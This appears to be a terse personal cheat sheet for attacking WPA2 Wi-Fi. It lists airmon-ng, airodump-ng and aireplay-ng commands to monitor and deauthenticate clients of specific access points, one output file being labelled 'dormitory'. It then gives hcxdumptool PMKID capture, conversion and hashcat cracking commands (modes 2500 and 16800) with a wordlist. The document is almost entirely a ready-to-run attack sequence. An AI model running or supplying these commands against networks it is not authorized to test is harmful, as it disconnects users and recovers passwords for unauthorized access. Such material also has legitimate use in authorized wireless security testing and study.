# Cap and Crack
## handshake
### prepare
`sudo airmon-ng check kill`
`sudo airmon-ng check kill`
`sudo airmon-ng check kill`
...
`iwconfig`
`airmon-ng start wlan0`
`iwconfig`

### scan
`sudo airodump-ng -w ~/mnt/hgfs/L/hashcat-5.0.0/dormitory wlan0mon`
stop

### monitor
`sudo airodump-ng --bssid DC:EE:06:96:B7:B8 -c 6 -w sec wlan0mon`

### deauth
`sudo aireplay-ng -0 10 -a EC:26:CA:33:E1:B6 -c C0:EE:FB:E9:9D:7C wlan0mon`

### stop
`Ctrl+C`
`sudo airmon-ng stop wlan0mon`

### convert
`cap2hccapx input.pcap output.hccapx`

### crack
`-m 2500`

## PMKID
### prepare
* `sudo airmon-ng check kill`
* `sudo airmon-ng start wlx70f11c11576b`
* `sudo airodump-ng wlan0mon` `Ctrl+C`
* `echo "FCD733E71B78" > apmac.txt`
* `sudo airmon-ng stop wlan0mon`
* set the interface to monitor mode manually:
     * `sudo ip link set <interface> down`
     * `sudo iw dev <interface> set monitor control`
     * `sudo ip link set <interface> up`

### cap
`sudo hcxdumptool -o test.pcapng -i wlp39s0f3u4u5 --filterlist=apmac.txt --filtermode=2 --enable_status=3`
`sudo hcxdumptool -o test.pcapng -i wlp39s0f3u4u5 --enable_status=3`

### convert
`$ sudo hcxpcaptool -z test.16800 test.pcapng`
`$ sudo hcxpcaptool -E essidlist -I identitylist -U usernamelsit -z test.16800 test.pcapng`
`echo 50555245204655524e4954555245 | xxd -r -p`
`whoismac -p 69d4ec91a19657d64d4ccc869c229bbe*9e3dcf272236*f0a225dab76d*53696c7665724d61676e6f6c6961`

### change to managed mode
`sudo ip link set wlx00c0ca972033 down`
`sudo iw dev wlx00c0ca972033 set type managed`
`sudo ip link set wlx00c0ca972033 up`

### crack
`c:\Users\Adam\Downloads\hashcat-4.2.0>hashcat64.exe -m 16800 E4200-WPA2PSK.16800 -a 0 wordlist.txt`
